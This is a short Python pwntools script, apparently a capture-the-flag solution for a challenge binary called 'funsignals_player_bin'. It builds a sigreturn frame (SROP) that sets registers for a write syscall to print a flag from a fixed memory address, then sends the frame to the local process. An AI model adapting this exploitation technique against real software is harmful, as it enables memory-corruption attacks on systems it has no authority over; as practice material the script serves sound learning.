#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-08-01 08:32:00
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *


context.arch = "amd64"
filename = "./funsignals_player_bin"
target_process = process(filename)


def exploit():
	frame = SigreturnFrame()

	frame.rax = 0x1        # syscall number
	frame.rdi = 0x1        # write to stdout
	frame.rsi = 0x10000023 # address of flag
	frame.rdx = 0x30	   # write count

	frame.rip = 0x1000000b # set rip to syscall

	target_process.send(bytes(frame))

	target_process.interactive()


def debug():
	pass


if __name__ == '__main__':
	exploit()

